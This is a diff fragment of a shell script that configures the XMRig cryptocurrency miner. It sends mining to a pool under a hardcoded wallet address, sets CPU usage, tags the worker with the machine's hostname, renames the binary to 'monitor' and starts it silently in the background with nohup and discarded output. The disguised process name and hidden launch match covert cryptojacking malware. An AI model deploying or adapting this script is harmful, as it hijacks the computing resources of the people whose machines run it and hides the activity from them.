@@ -6,7 +6,7 @@ cd  xmrig-2.14.1
 sed -i "s/donate.v2.xmrig.com:3333/mine.c3pool.com:19999/g" config.json
 sed -i "s/YOUR_WALLET_ADDRESS/41tYfhLer7d4X923KmM7ZRTNeLpec1KYDC1bQjQmQiiPAjgmsVLnJkMP4VrXHj51KUMkSmKQsvozg5Wv5K5ZJ9DQ38ap9wL/g" config.json
 sed -i "s/100/75/g" config.json
-sed -i "s/\"test\"/\"`hostname`\"/g" config.json
+sed -i "s/\"x\"/\"`hostname`\"/g" config.json
 mv xmrig monitor
 nohup ./monitor  >/dev/null 2>&1 &
 cd ..
